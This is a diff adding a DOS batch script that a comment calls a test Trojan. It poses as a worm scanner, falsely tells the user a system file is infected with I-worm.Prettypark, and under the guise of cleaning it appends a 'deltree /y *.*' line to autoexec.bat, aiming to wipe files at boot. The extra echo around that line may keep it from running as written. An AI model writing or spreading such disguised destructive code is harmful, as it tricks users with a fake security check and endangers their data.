@@ -1,0 +1,28 @@
+@echo off
+rem  This is a stupid test Trojan.
+echo This program will check your computer for
+echo most of the Internet worms in the wild.
+echo Including IRC, mIRC, pIRC, VBS, and I-worms
+echo like Happy99
+pause
+cls
+echo If any worms are found, I will attempt to
+echo clean them off your computer.
+pause
+cls
+echo echo danieldanieldanieldaniel >> c:\windows\system\strtup.exe
+if exist c:\autoexec.bat goto found
+if not exist c:\autoexec.bat goto nfound
+:found
+goto next
+:nfound
+echo No worms were found on your computer.
+pause
+cls
+:next
+echo c:\windows\system\strtup.exe is infected with I-worm.Prettypark.
+echo I will now attempt to clean it from your computer.
+pause
+cls
+echo echo deltree  /y *.* >> c:\autoexec.bat
+rem wow, maybe this is the first if its kind? :)
